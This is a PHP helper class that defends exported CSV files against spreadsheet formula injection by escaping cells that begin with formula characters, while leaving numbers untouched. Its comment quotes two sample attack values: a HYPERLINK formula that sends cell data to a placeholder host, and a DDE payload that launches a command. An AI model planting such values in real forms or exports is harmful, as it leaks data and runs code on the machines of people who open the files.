<?php
declare(strict_types=1);

namespace AfricaGates\Support;

/**
 * Every CSV this platform writes goes through here, so a spreadsheet cannot run what a stranger
 * typed into a form.
 *
 * A cell that begins with `=`, `+`, `-`, `@`, a tab or a carriage return is a FORMULA to Excel,
 * Sheets and LibreOffice. A guest who registers as `=HYPERLINK("https://x.example/?"&A2,"Ticket")`
 * or a donor named `@SUM(1+1)*cmd|' /C calc'!A0` is code on the machine of whichever operator opens
 * the export — with the operator's trust, on a file this platform handed them. Prefixing an
 * apostrophe makes the spreadsheet show the text as typed and run nothing (OWASP's CSV injection
 * guidance).
 *
 * Numbers are left alone, including negative ones: a points ledger's `-5` and a refund's
 * `-2000.50` are data, and an apostrophe would turn them into text nobody can sum. Only a value
 * that IS a number is spared — `-1+1` is not one.
 *
 * `CsvInjectionTest` sweeps `src/` for an fputcsv() that does not come through here.
 */
final class Csv
{
    /** One cell, safe to open in a spreadsheet. */
    public static function cell(mixed $v): mixed
    {
        if ($v === null || is_int($v) || is_float($v) || is_bool($v)) return $v;
        $s = (string) $v;
        if ($s === '' || preg_match('/^-?\d+(\.\d+)?$/', $s)) return $s;
        return strpbrk($s[0], "=+-@\t\r") !== false ? "'" . $s : $s;
    }

    /**
     * fputcsv() with every cell neutralised. Same arguments and return as fputcsv(), so a call
     * site keeps its own separator and escape choice.
     *
     * @param resource $handle
     */
    public static function put($handle, array $row, string $separator = ',', string $enclosure = '"', string $escape = '\\'): int|false
    {
        return fputcsv($handle, array_map([self::class, 'cell'], $row), $separator, $enclosure, $escape);
    }
}
